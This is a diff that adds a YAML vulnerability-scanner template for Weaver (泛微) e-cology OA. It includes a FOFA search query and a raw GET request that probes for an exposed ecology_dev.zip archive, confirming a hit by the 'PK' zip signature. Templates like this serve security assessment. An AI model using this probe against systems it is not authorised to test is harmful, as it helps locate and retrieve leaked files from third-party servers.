@@ -1,0 +1,23 @@
+id: ecology-ecology-dev-infoleak
+
+info:
+  name: 泛微-ecology-信息泄漏-ecology_dev
+  author: HuanXiong
+  severity: high
+  metadata: 
+    fofa-query: app="泛微-OA（e-cology）"
+
+  tags: Information Disclosure
+
+http:
+  - raw:
+      - |
+        GET /cloudstore/ecode/setup/ecology_dev.zip HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 信息泄漏
+        dsl:
+          - "status_code==200 && contains_all(body,'PK')"
